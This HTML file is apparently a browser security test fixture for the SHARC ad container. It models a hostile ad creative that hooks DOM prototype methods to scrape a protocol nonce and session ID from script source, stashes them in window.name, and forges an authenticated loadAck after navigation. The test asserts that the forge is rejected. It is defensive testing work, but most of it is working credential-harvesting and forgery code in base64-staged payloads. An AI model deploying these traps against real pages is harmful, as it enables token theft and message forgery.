<!DOCTYPE html>
<!--
  docopen-harvest-forge-host.html — SE security matrix (C1, harvest-then-forge).

  THE adversarial exploit-as-test. A hostile creative does NOT merely scan the
  reopened DOM AFTER self-removal (the false-green the shipped C1 fixture
  modelled). It pre-installs TRAPS on Document.prototype.querySelector and
  Node.prototype.removeChild — both prototype methods that SURVIVE
  document.open() — so when the re-injected load-probe prelude runs its FINAL
  self-removal statement:

        var __s = document.querySelector('script[data-sharc-prelude="load-probe"]');
        if (__s && __s.parentNode) __s.parentNode.removeChild(__s);

  the trap fires DURING that call and reads the live nonce literal out of the
  script's source text BEFORE removal completes. The renderer-protocol nonce is
  session-stable (HMAC over prefix+':'+placementSessionId, identical across
  generations), so one harvest is enough to forge nonce-authenticated traffic
  for the ad's whole lifetime.

  Chain:
    gen=1  install prototype traps, then document.open self-rewrite → gen=2.
    gen=2  trap fires during the prelude's self-removal → harvest ackNonce +
           placementSessionId + containerOrigin from the script source text;
           stash into window.name (survives same-origin navigation); then
           perform a REAL cross-document navigation to the renderer-origin
           forge-payload page.
    nav    forge-payload posts a forged :loadAck with the harvested nonce to
           suppress the 2118 that the real navigation must trip.

  ASSERTION (test): 2118 STILL fires. The forged loadAck is rejected because
  the harvested nonce is dead for the post-navigation gate (fresh-nonce-per-
  generation). RED against session-stable nonce (forge accepted, no 2118).

  Markers:
    [LIFELOG] gen=2 harvest trap fired tokens=<n>
    [LIFELOG] gen=2 harvest result: harvestedNonce=present|ABSENT ...
    [HOSTLOG] onError 2118: ...   ← REQUIRED for GREEN
-->
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>SHARC — document.open harvest-then-forge exploit</title>
    <style>html,body{margin:0;padding:0}#adSlot{width:300px;height:250px}</style>
    <script type="module" src="/dist/sharc-container.mjs"></script>
  </head>
  <body>
    <div id="adSlot"></div>
    <script type="module">
      const u = new URL(window.location.href);
      const rendererPort = (Number(u.port) || 8765) + 1;
      const RENDERER_BASE = u.protocol + '//' + u.hostname + ':' + rendererPort;
      const rendererUrl = RENDERER_BASE + '/examples/renderer/';
      // Renderer-origin forge payload (same origin as the renderer iframe, so a
      // loadAck it posts passes the router source/origin gate). A REAL cross-
      // document navigation target the renderer never provisioned.
      const FORGE_URL = RENDERER_BASE + '/test/browser/fixtures/lifecycle/docopen-forge-payload.html';

      // gen=3 body: the NAVIGATE-and-forge stage. Reads the harvested context
      // the trap stashed (survives across reopens in window.__HARVEST and is
      // copied to window.name to survive the cross-document navigation), then
      // performs the REAL navigation to the renderer-origin forge payload, which
      // forges a :loadAck with the (now generation-stale) harvested nonce.
      const gen3Body = [
        '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">',
        '<style>body{margin:0;padding:0}</style>',
        '<script>',
        '  window.LOG = window.LOG || function(){};',
        '  window.addEventListener("load", function () {',
        '    LOG("gen=3 window load");',
        '    try {',
        '      var h = window.__HARVEST || {};',
        '      window.name = JSON.stringify({ harvestedNonce: h.nonce || "",',
        '        placementSessionId: h.psid || "", containerOrigin: h.origin || "" });',
        '      setTimeout(function () {',
        '        LOG("gen=3 performing REAL navigation to renderer-origin forge payload");',
        '        try { window.location.href = ' + JSON.stringify(FORGE_URL) + '; }',
        '        catch (e) { LOG("gen=3 nav threw: " + e.message); }',
        '      }, 0);',
        '    } catch (e) { LOG("gen=3 nav error: " + e.message); }',
        '  }, true);',
        '<\/script></head><body><h1>navigate</h1></body></html>',
      ].join('\n');
      const gen3BodyB64 = btoa(unescape(encodeURIComponent(gen3Body)));

      // gen=2 body: the HARVEST stage. It runs in the reopened document, where
      // gen=1's prototype traps are already armed (prototypes survive
      // document.open). The trap captures the GENERATION-1 nonce literal during
      // the prelude's self-removal. gen=2 then performs ONE MORE legit reopen
      // (to gen=3), which advances the container's reverse-chain generation PAST
      // the harvested value — so by the time gen=3 forges, the harvested
      // generation-1 nonce is STALE. This is the binding C1 property: a nonce
      // harvested in generation N is invalid for generation N+1's gate.
      const gen2Body = [
        '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">',
        '<style>body{margin:0;padding:0}</style>',
        '<script>',
        '  window.LOG = window.LOG || function(){};',
        '  window.addEventListener("load", function () {',
        '    LOG("gen=2 window load");',
        '    try {',
        '      var h = window.__HARVEST || {};',
        '      var nonce = h.nonce || "";',
        '      var psid = h.psid || "";',
        '      var origin = h.origin || "";',
        '      LOG("gen=2 harvest result: harvestedNonce=" + (nonce ? "present" : "ABSENT")',
        '        + " psid=" + (psid ? "present" : "ABSENT")',
        '        + " origin=" + (origin ? "present" : "ABSENT")',
        '        + " nonceSample=" + JSON.stringify(String(nonce).slice(0, 6)));',
        // One more legit reopen → gen=3. The renderer re-injects the harness and
        // advances its chain; the container advances current PAST the harvested
        // generation. gen=3 then navigates + forges with the stale nonce.
        '      setTimeout(function () {',
        '        LOG("gen=2 reopening to gen=3 (advances the chain past the harvested nonce)");',
        '        var html = decodeURIComponent(escape(atob("' + gen3BodyB64 + '")));',
        '        document.open(); document.write(html); document.close();',
        '      }, 0);',
        '    } catch (e) { LOG("gen=2 harvest error: " + e.message); }',
        '  }, true);',
        '<\/script></head><body><h1>harvest</h1></body></html>',
      ].join('\n');
      const gen2BodyB64 = btoa(unescape(encodeURIComponent(gen2Body)));

      const creativeHtml = [
        '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">',
        '<script>',
        '  window.__LIFELOG_T0 = performance.now();',
        '  window.LOG = function (tag) {',
        '    console.log("[LIFELOG] " + performance.now().toFixed(2) + " " + Date.now() + " " + tag);',
        '  };',
        '  LOG("gen=1 head script run — installing prototype harvest traps");',
        // ── PROTOTYPE TRAPS (survive document.open) ──────────────────────────
        // These hook the EXACT calls the prelude self-removal uses:
        //   document.querySelector(selector) → returns the prelude <script>
        //   node.parentNode.removeChild(node) → removes it
        // The trap reads the script element source text (where the nonce is
        // baked) BEFORE removal completes, harvesting the live nonce literal.
        '  (function () {',
        '    window.__HARVEST = window.__HARVEST || {};',
        '    function scrape(text) {',
        '      if (!text) return;',
        '      var s = String(text);',
        // ackNonce literal: var ackNonce="<base64url>";  (also protocolNonce/sharcNonce)
        '      var m = s.match(/(?:ackNonce|protocolNonce|sharcNonce|rendererNonce)\\s*=\\s*"([A-Za-z0-9_-]{16,})"/);',
        '      if (m && m[1] && !window.__HARVEST.nonce) {',
        '        window.__HARVEST.nonce = m[1];',
        '        window.LOG && window.LOG("gen=2 harvest trap fired nonce captured");',
        '      }',
        '      var p = s.match(/placementSessionId\\s*=\\s*"([0-9a-f-]{36})"/i);',
        '      if (p && p[1] && !window.__HARVEST.psid) window.__HARVEST.psid = p[1];',
        '      var o = s.match(/containerOrigin\\s*=\\s*"(https?:\\/\\/[^"]+)"/);',
        '      if (o && o[1] && !window.__HARVEST.origin) window.__HARVEST.origin = o[1];',
        '    }',
        '    var nativeQS = Document.prototype.querySelector;',
        '    Document.prototype.querySelector = function (sel) {',
        '      var el = nativeQS.apply(this, arguments);',
        '      try {',
        '        if (el && el.tagName === "SCRIPT") { scrape(el.textContent); scrape(el.text); }',
        '      } catch (_) {}',
        '      return el;',
        '    };',
        '    var nativeRC = Node.prototype.removeChild;',
        '    Node.prototype.removeChild = function (child) {',
        '      try {',
        '        if (child && child.tagName === "SCRIPT") { scrape(child.textContent); scrape(child.text); }',
        '      } catch (_) {}',
        '      return nativeRC.apply(this, arguments);',
        '    };',
        '  }());',
        '<\/script>',
        '<script>',
        '  window.addEventListener("load", function () {',
        '    LOG("gen=1 window load — self-rewriting to harvest stage");',
        '    setTimeout(function () {',
        '      var html = decodeURIComponent(escape(atob("' + gen2BodyB64 + '")));',
        '      document.open(); document.write(html); document.close();',
        '    }, 0);',
        '  }, true);',
        '<\/script></head><body></body></html>',
      ].join('\n');

      function whenReady(cb) {
        if (window.SHARC && typeof window.SHARC.Container === 'function') { cb(); return; }
        var iv = setInterval(function () {
          if (window.SHARC && typeof window.SHARC.Container === 'function') { clearInterval(iv); cb(); }
        }, 10);
      }
      whenReady(function () {
        var c = new SHARC.Container({
          creativeHtml: creativeHtml,
          creativeRendererUrl: rendererUrl,
          bridges: ['mraid'],
          placementElement: document.getElementById('adSlot'),
          environmentData: {
            currentPlacement: {
              initialDefaultSize: { width: 300, height: 250 },
              minDefaultSize: { width: 300, height: 250 },
              maxDefaultSize: { width: 300, height: 250 },
              maxExpandSize: { width: window.innerWidth, height: window.innerHeight },
              viewportSize: { width: window.innerWidth, height: window.innerHeight },
            },
            dataspec: { model: 'AdCOM', ver: '1.0' },
            data: { ad: { id: 'docopen-harvest-forge' }, isMuted: false, volume: 1,
              placement: { tagid: 'harvest-forge-slot', instl: 0 } },
            containerNavigation: { navigationPossible: true, navigationAllowed: true },
            isMuted: false, volume: 1,
          },
          supportedFeatures: [{ name: 'com.iabtechlab.sharc.mraid', version: '1.0', functions: {} }],
          timeouts: { rendererLoad: 8000, rendererReply: 6000 },
          autoStart: true, visible: false,
          onStateChange: function (n, p) { console.log('[HOSTLOG] state: ' + (p || '-') + ' -> ' + n); },
          onError: function (code, msg) { console.log('[HOSTLOG] onError ' + code + ': ' + msg); },
        });
        if (typeof c.load === 'function') c.load();
      });
    </script>
  </body>
</html>
